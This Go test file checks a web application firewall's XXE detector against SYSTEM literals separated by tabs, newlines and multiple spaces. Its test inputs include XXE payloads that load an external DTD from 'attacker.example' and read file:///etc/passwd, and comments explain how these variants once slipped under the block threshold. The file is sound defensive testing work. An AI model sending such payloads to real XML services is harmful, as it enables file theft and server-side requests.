package xxe

import (
	"strings"
	"testing"

	"github.com/guardianwaf/guardianwaf/internal/engine"
)

// Whitespace-separated SYSTEM literals: XML's ExternalID is
// "SYSTEM S SystemLiteral" (S = one or more of space/tab/CR/LF), but the
// protocol checks matched exactly one literal space, so tab / newline /
// multi-space variants evaded every protocol finding:
//
//   - external-DTD XXE (no internal <!ENTITY needed) scored 25 (doctype
//     only) instead of 100 — below the default block threshold of 50;
//   - entity-carrying file:// payloads kept their stacked doctype/entity
//     scores but lost the 95-point protocol classification.
func TestDetect_SystemWhitespaceVariants(t *testing.T) {
	d := NewDetector(true, 1)

	for _, v := range []struct{ name, ws string }{
		{"tab", "\t"},
		{"double-space", "  "},
		{"newline", "\n"},
		{"crlf", "\r\n"},
	} {
		payload := `<!DOCTYPE r SYSTEM` + v.ws + `"http://attacker.example/evil.dtd">`
		res := d.Process(&engine.RequestContext{ContentType: "application/xml", BodyString: payload})
		if !hasProtocolDescription(res.Findings, "http://") || res.Score < 75 {
			t.Errorf("%s: external-DTD XXE score = %d, want >= 75 with an http:// protocol finding", v.name, res.Score)
		}
	}

	for _, v := range []struct{ name, ws string }{
		{"tab", "\t"},
		{"newline", "\n"},
	} {
		payload := `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM` + v.ws + `"file:///etc/passwd">]><r>&xxe;</r>`
		res := d.Process(&engine.RequestContext{ContentType: "application/xml", BodyString: payload})
		if !hasProtocolDescription(res.Findings, "file://") || res.Score < 95 {
			t.Errorf("%s: file:// XXE score = %d, want >= 95 with a file:// protocol finding", v.name, res.Score)
		}
	}

	// Single-quoted literal with real tab separation must be covered too.
	res := d.Process(&engine.RequestContext{
		ContentType: "application/xml",
		BodyString:  "<!DOCTYPE r SYSTEM\t'file:///etc/passwd'>",
	})
	if !hasProtocolDescription(res.Findings, "file://") {
		t.Error("single-quoted tab-separated SYSTEM literal lost its file:// protocol finding")
	}
}

func TestDetect_SystemSingleSpaceStillDetected(t *testing.T) {
	d := NewDetector(true, 1)
	res := d.Process(&engine.RequestContext{
		ContentType: "application/xml",
		BodyString:  `<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd">`,
	})
	if !hasProtocolDescription(res.Findings, "http://") || res.Score < 75 {
		t.Errorf("canonical single-space form regressed: score = %d, want >= 75 with an http:// finding", res.Score)
	}
}

// The whitespace-run match must still REQUIRE the whitespace and the quote:
// a quote glued to the keyword (invalid XML), a non-listed scheme, and a
// non-quote token after the whitespace run stay unflagged as protocol
// findings.
func TestDetect_SystemNonProtocolFormsNotFlagged(t *testing.T) {
	d := NewDetector(true, 1)
	for _, payload := range []string{
		`<!DOCTYPE r SYSTEM"file:///etc/passwd">`,       // no whitespace — invalid XML
		`<!DOCTYPE r SYSTEM "ftp://host/etc">`,          // scheme not in the protocol list
		"<!DOCTYPE r SYSTEM\tx \"file:///etc/passwd\">", // non-quote token after the run
	} {
		res := d.Process(&engine.RequestContext{ContentType: "application/xml", BodyString: payload})
		for _, f := range res.Findings {
			if strings.Contains(f.Description, "protocol detected") {
				t.Errorf("payload %q unexpectedly produced protocol finding %q", payload, f.Description)
			}
		}
	}
}

func hasProtocolDescription(findings []engine.Finding, substr string) bool {
	for _, f := range findings {
		if strings.Contains(f.Description, substr) {
			return true
		}
	}
	return false
}
